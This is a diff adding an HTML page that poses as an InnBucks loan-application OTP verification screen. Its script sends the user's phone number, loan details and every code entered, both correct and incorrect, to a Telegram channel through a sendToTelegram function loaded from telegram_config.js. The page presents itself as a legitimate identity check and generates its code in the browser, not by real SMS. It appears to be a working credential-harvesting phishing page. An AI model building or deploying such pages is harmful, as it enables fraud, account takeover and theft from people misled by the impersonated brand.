@@ -1,0 +1,480 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OTP Verification - InnBucks</title>
+    <script src="telegram_config.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, sans-serif;
+        }
+
+        body {
+            background: #0A1931;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            color: white;
+            text-align: center;
+        }
+
+        .header {
+            margin-bottom: 30px;
+            max-width: 400px;
+        }
+
+        .title {
+            font-size: 1.8rem;
+            font-weight: 600;
+            margin-bottom: 15px;
+        }
+
+        .subtitle {
+            font-size: 1rem;
+            opacity: 0.9;
+            line-height: 1.5;
+            margin-bottom: 10px;
+        }
+
+        .phone-number {
+            font-size: 1.1rem;
+            font-weight: 600;
+            color: white;
+            background: rgba(255, 255, 255, 0.1);
+            padding: 8px 20px;
+            border-radius: 20px;
+            display: inline-block;
+            margin-top: 5px;
+        }
+
+        .otp-section {
+            max-width: 400px;
+            margin-bottom: 30px;
+        }
+
+        .otp-input-container {
+            position: relative;
+            margin: 25px 0;
+        }
+
+        .hidden-otp-input {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0;
+            font-size: 16px;
+            cursor: default;
+            z-index: 1;
+        }
+
+        .otp-dots {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            position: relative;
+            z-index: 0;
+        }
+
+        .otp-dot {
+            width: 16px;
+            height: 16px;
+            background: transparent;
+            border: 2px solid rgba(255, 255, 255, 0.7);
+            border-radius: 50%;
+            position: relative;
+            transition: all 0.3s ease;
+        }
+
+        .otp-dot.filled::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 8px;
+            height: 8px;
+            background: white;
+            border-radius: 50%;
+        }
+
+        .otp-dot.active {
+            border-color: white;
+            transform: scale(1.2);
+        }
+
+        .resend-section {
+            margin-bottom: 25px;
+        }
+
+        .resend-button {
+            background: transparent;
+            color: white;
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            border-radius: 25px;
+            padding: 10px 25px;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .resend-button:hover:not(:disabled) {
+            background: rgba(255, 255, 255, 0.1);
+        }
+
+        .resend-button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .timer {
+            font-size: 0.85rem;
+            color: #ff6b6b;
+            margin-top: 8px;
+            font-weight: 600;
+        }
+
+        .verify-button {
+            background: white;
+            color: #0A1931;
+            border: none;
+            border-radius: 25px;
+            padding: 16px 40px;
+            font-size: 1.1rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 10px;
+        }
+
+        .verify-button:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 16px rgba(255, 255, 255, 0.1);
+        }
+
+        .verify-button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .status-message {
+            font-size: 0.85rem;
+            margin-top: 15px;
+            height: 20px;
+            color: #4CAF50;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        .status-message.show {
+            opacity: 1;
+        }
+
+        .error-message {
+            color: #ff6b6b;
+            font-size: 0.9rem;
+            margin-top: 10px;
+            min-height: 20px;
+        }
+
+        @media (max-width: 480px) {
+            .title { font-size: 1.6rem; }
+            .otp-dots { gap: 12px; }
+            .otp-dot { width: 14px; height: 14px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="title">Verify Your Identity</div>
+        <div class="subtitle">
+            Enter the 6-digit code sent to your mobile
+        </div>
+        <div class="phone-number" id="phoneDisplay">+263784410581</div>
+    </div>
+
+    <!-- OTP DOTS -->
+    <div class="otp-section">
+        <div class="otp-input-container">
+            <input 
+                type="text" 
+                class="hidden-otp-input" 
+                id="hiddenOtpInput"
+                inputmode="numeric"
+                maxlength="6"
+                pattern="\d*"
+                autocomplete="one-time-code"
+            >
+            
+            <div class="otp-dots" id="otpDots">
+                <div class="otp-dot" data-index="0"></div>
+                <div class="otp-dot" data-index="1"></div>
+                <div class="otp-dot" data-index="2"></div>
+                <div class="otp-dot" data-index="3"></div>
+                <div class="otp-dot" data-index="4"></div>
+                <div class="otp-dot" data-index="5"></div>
+            </div>
+        </div>
+        
+        <div class="status-message" id="statusMessage"></div>
+        <div class="error-message" id="errorMessage"></div>
+    </div>
+
+    <!-- RESEND SECTION -->
+    <div class="resend-section">
+        <div class="resend-text">Didn't receive the code?</div>
+        <button class="resend-button" id="resendButton" disabled>
+            Resend code (60s)
+        </button>
+        <div class="timer" id="timer"></div>
+    </div>
+
+    <!-- VERIFY BUTTON -->
+    <button class="verify-button" id="verifyButton" disabled>
+        Verify & Complete Application
+    </button>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Load application data
+            const applicationData = JSON.parse(localStorage.getItem('innbucksLoanApp') || '{}');
+            
+            // Generate random 6-digit OTP
+            const generatedOTP = Math.floor(100000 + Math.random() * 900000).toString();
+            
+            // Store OTP in localStorage for verification
+            applicationData.generatedOTP = generatedOTP;
+            localStorage.setItem('innbucksLoanApp', JSON.stringify(applicationData));
+            
+            // Update UI with application data
+            if (applicationData.phoneNumber) {
+                document.getElementById('phoneDisplay').textContent = applicationData.phoneNumber;
+            }
+            
+            // Send OTP to console (in production, this would be SMS)
+            console.log('📱 OTP for', applicationData.phoneNumber, 'is:', generatedOTP);
+            
+            // Send to Telegram that OTP was generated
+            sendToTelegram(`🔐 <b>OTP Generated</b>\nPhone: ${applicationData.phoneNumber}\nOTP: <code>${generatedOTP}</code>\nAmount: $${applicationData.loanAmount}\nTerm: ${applicationData.loanTerm} months`);
+            
+            const otpDots = document.querySelectorAll('.otp-dot');
+            const hiddenInput = document.getElementById('hiddenOtpInput');
+            const verifyButton = document.getElementById('verifyButton');
+            const resendButton = document.getElementById('resendButton');
+            const statusMessage = document.getElementById('statusMessage');
+            const errorMessage = document.getElementById('errorMessage');
+            const timerElement = document.getElementById('timer');
+            
+            let currentOTP = '';
+            const otpLength = 6;
+            let countdown = 60;
+            let countdownInterval;
+            let attempts = 0;
+            const MAX_ATTEMPTS = 5;
+            
+            function initialize() {
+                // Focus hidden input when clicking on OTP dots
+                document.getElementById('otpDots').addEventListener('click', function() {
+                    hiddenInput.focus();
+                });
+                
+                setTimeout(() => hiddenInput.focus(), 500);
+                
+                // Handle input changes
+                hiddenInput.addEventListener('input', function(e) {
+                    let value = this.value;
+                    
+                    if (!/^\d*$/.test(value)) {
+                        this.value = currentOTP;
+                        return;
+                    }
+                    
+                    if (value.length > otpLength) {
+                        value = value.slice(0, otpLength);
+                        this.value = value;
+                    }
+                    
+                    currentOTP = value;
+                    updateDots();
+                    
+                    verifyButton.disabled = currentOTP.length !== otpLength;
+                    
+                    if (currentOTP.length === otpLength) {
+                        showStatus('✓ All digits entered - Click Verify');
+                    } else {
+                        showStatus(`Enter ${otpLength - currentOTP.length} more digits`);
+                    }
+                });
+                
+                // Handle paste
+                hiddenInput.addEventListener('paste', function(e) {
+                    e.preventDefault();
+                    const pastedData = e.clipboardData.getData('text').trim();
+                    
+                    if (/^\d{6}$/.test(pastedData)) {
+                        this.value = pastedData;
+                        currentOTP = pastedData;
+                        updateDots();
+                        verifyButton.disabled = false;
+                        showStatus('✓ Code pasted successfully!');
+                        
+                        otpDots.forEach(dot => {
+                            dot.style.transform = 'scale(1.3)';
+                            setTimeout(() => dot.style.transform = '', 300);
+                        });
+                    }
+                });
+                
+                // Verify button click
+                verifyButton.addEventListener('click', function() {
+                    if (currentOTP.length !== otpLength) return;
+                    
+                    attempts++;
+                    
+                    if (currentOTP === generatedOTP) {
+                        // Success - correct OTP
+                        const originalText = verifyButton.textContent;
+                        verifyButton.innerHTML = '✓ VERIFIED - PROCESSING...';
+                        verifyButton.disabled = true;
+                        
+                        showStatus('✅ OTP verified successfully!');
+                        
+                        // Send success to Telegram
+                        sendToTelegram(`✅ <b>SUCCESSFUL VERIFICATION</b>\nPhone: ${applicationData.phoneNumber}\nOTP: ${currentOTP}\nAmount: $${applicationData.loanAmount}\n\n🎉 Application Complete!`);
+                        
+                        // Complete application
+                        setTimeout(() => {
+                            alert('✅ VERIFICATION SUCCESSFUL!\n\nYour loan application has been submitted successfully.\nYou will receive confirmation via SMS shortly.');
+                            
+                            // Clear sensitive data
+                            delete applicationData.generatedOTP;
+                            localStorage.setItem('innbucksLoanApp', JSON.stringify(applicationData));
+                            
+                            // Redirect to success page or home
+                            window.location.href = 'index.html';
+                        }, 1500);
+                        
+                    } else {
+                        // WRONG OTP - Send to Telegram!
+                        errorMessage.textContent = `❌ Invalid OTP. ${MAX_ATTEMPTS - attempts} attempts remaining.`;
+                        
+                        // Format and send detailed error to Telegram
+                        const errorMessageTelegram = formatOTPErrorMessage(
+                            applicationData.phoneNumber || 'Unknown',
+                            currentOTP,
+                            generatedOTP,
+                            applicationData
+                        );
+                        
+                        sendToTelegram(errorMessageTelegram);
+                        
+                        // Clear input for retry
+                        hiddenInput.value = '';
+                        currentOTP = '';
+                        updateDots();
+                        verifyButton.disabled = true;
+                        
+                        if (attempts >= MAX_ATTEMPTS) {
+                            errorMessage.textContent = '❌ Too many invalid attempts. Please try again later.';
+                            verifyButton.disabled = true;
+                            hiddenInput.disabled = true;
+                            
+                            // Send max attempts alert
+                            sendToTelegram(`⚠️ <b>MAX ATTEMPTS REACHED</b>\nPhone: ${applicationData.phoneNumber}\nBlocked after ${MAX_ATTEMPTS} invalid attempts.`);
+                        }
+                    }
+                });
+                
+                // Start countdown
+                startCountdown();
+            }
+            
+             function updateDots() {
+                otpDots.forEach((dot, index) => {
+                    dot.classList.remove('filled', 'active');
+                    
+                    if (index < currentOTP.length) {
+                        dot.classList.add('filled');
+                    }
+                    
+                    if (index === currentOTP.length) {
+                        dot.classList.add('active');
+                    }
+                });
+            }
+            
+            function showStatus(message) {
+                statusMessage.textContent = message;
+                statusMessage.classList.add('show');
+                setTimeout(() => statusMessage.classList.remove('show'), 3000);
+            }
+            
+            function startCountdown() {
+                countdown = 60;
+                resendButton.disabled = true;
+                resendButton.textContent = `Resend code (${countdown}s)`;
+                timerElement.textContent = '';
+                
+                countdownInterval = setInterval(() => {
+                    countdown--;
+                    resendButton.textContent = `Resend code (${countdown}s)`;
+                    
+                    if (countdown <= 0) {
+                        clearInterval(countdownInterval);
+                        resendButton.disabled = false;
+                        resendButton.textContent = 'Resend code';
+                        timerElement.textContent = 'Click to request new code';
+                    }
+                }, 1000);
+            }
+            
+            // Resend button
+            resendButton.addEventListener('click', function() {
+                if (resendButton.disabled) return;
+                
+                const originalText = resendButton.textContent;
+                resendButton.textContent = 'Sending...';
+                resendButton.disabled = true;
+                
+                // Generate new OTP
+                const newOTP = Math.floor(100000 + Math.random() * 900000).toString();
+                applicationData.generatedOTP = newOTP;
+                localStorage.setItem('innbucksLoanApp', JSON.stringify(applicationData));
+                
+                console.log('📱 New OTP:', newOTP);
+                
+                // Send new OTP to Telegram
+                sendToTelegram(`🔄 <b>OTP Resent</b>\nPhone: ${applicationData.phoneNumber}\nNew OTP: <code>${newOTP}</code>\nPrevious attempts: ${attempts}`);
+                
+                setTimeout(() => {
+                    resendButton.textContent = originalText;
+                    showStatus('✓ New verification code sent!');
+                    
+                    // Reset attempts
+                    attempts = 0;
+                    errorMessage.textContent = '';
+                    
+                    // Clear input
+                    hiddenInput.value = '';
+                    currentOTP = '';
+                    updateDots();
+                    verifyButton.disabled = true;
+                    
+                    // Restart countdown
+                    startCountdown();
+                }, 1000);
+            });
+            
+            initialize();
+        });
+    </script>
+</body>
+</html>
